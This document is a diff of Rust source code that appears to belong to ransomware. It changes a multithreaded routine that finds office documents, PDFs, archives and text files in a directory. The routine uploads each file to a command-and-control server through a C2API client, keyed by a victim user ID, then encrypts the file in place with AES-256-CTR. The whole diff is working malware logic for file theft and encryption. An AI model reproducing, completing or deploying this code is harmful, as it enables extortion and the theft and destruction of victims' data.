@@ -2,11 +2,7 @@ use aes::{
     cipher::{NewCipher, StreamCipher},
     Aes256Ctr,
 };
-use rand::{
-    distributions::Uniform,
-    thread_rng,
-    Rng
-};
+use rand::{distributions::Uniform, thread_rng, Rng};
 use walkdir::WalkDir;
 
 use std::{
@@ -34,11 +30,10 @@ fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Re
 
 pub fn gen_aes_key(key_size: usize) -> String {
     let rng = thread_rng();
-    rng
-    .sample_iter(&Uniform::new(32, 126))
-    .take(key_size)
-    .map(char::from)
-    .collect()
+    rng.sample_iter(&Uniform::new(32, 126))
+        .take(key_size)
+        .map(char::from)
+        .collect()
 }
 
 fn inc_counter(nonce: &mut [u8]) {
@@ -174,9 +169,15 @@ pub fn encrypt_decrypt_file(
     return Ok(total_read_bytes);
 }
 
-pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8], user_id: String){
-    
-    let extensions = ["doc", "docx", "odt", "pdf", "xls", "xlsx", "ppt", "pptx", "zip", "txt"];
+pub fn multi_threaded_encrypt_decrypt_files(
+    directory: &str,
+    aes_key: &[u8],
+    user_id: String,
+    is_encryption: u8,
+) {
+    let extensions = [
+        "doc", "docx", "odt", "pdf", "xls", "xlsx", "ppt", "pptx", "zip", "txt",
+    ];
     let num_threads = 4;
 
     let mut file_paths: Vec<PathBuf> = Vec::new();
@@ -202,38 +203,39 @@ pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8], use
         let user_id_clone = user_id.clone();
         let (tx, rx) = channel::<PathBuf>();
         job_senders.push(tx);
-        let thread_handle = thread::spawn(move || 
-            loop {
-                match rx.recv() {
-                    Ok(path) => {
-                        let c2 = C2API::new();
-                        if path.to_str().unwrap() == "_END_SEARCH_" {
-                            for element in &mut aes_key_vec {
-                                *element = 0;
-                            }
-                            break;
+        let thread_handle = thread::spawn(move || loop {
+            match rx.recv() {
+                Ok(path) => {
+                    let c2 = C2API::new();
+                    if path.to_str().unwrap() == "_END_SEARCH_" {
+                        for element in &mut aes_key_vec {
+                            *element = 0;
                         }
+                        break;
+                    }
+                    if is_encryption == 1 {
                         if let Some(extension) = path.extension() {
                             if let Some(extension_str) = extension.to_str() {
                                 if extensions.contains(&extension_str) {
-                                    match c2.upload_file(path.to_string_lossy().to_string(), &user_id_clone) {
-                                        _ => ()
+                                    match c2.upload_file(
+                                        path.to_string_lossy().to_string(),
+                                        &user_id_clone,
+                                    ) {
+                                        _ => (),
                                     };
                                 }
                             }
                         }
-                        match encrypt_decrypt_file(
-                            path.to_str().unwrap(),
-                            &aes_key_vec[..],
-                        ) {
-                            Ok(bytes_read) => bytes_read,
-                            Err(_) => 0,
-                        };
                     }
-                    Err(_) => break,
+
+                    match encrypt_decrypt_file(path.to_str().unwrap(), &aes_key_vec[..]) {
+                        Ok(bytes_read) => bytes_read,
+                        Err(_) => 0,
+                    };
                 }
+                Err(_) => break,
             }
-        );
+        });
         threads.push(thread_handle);
     }
 
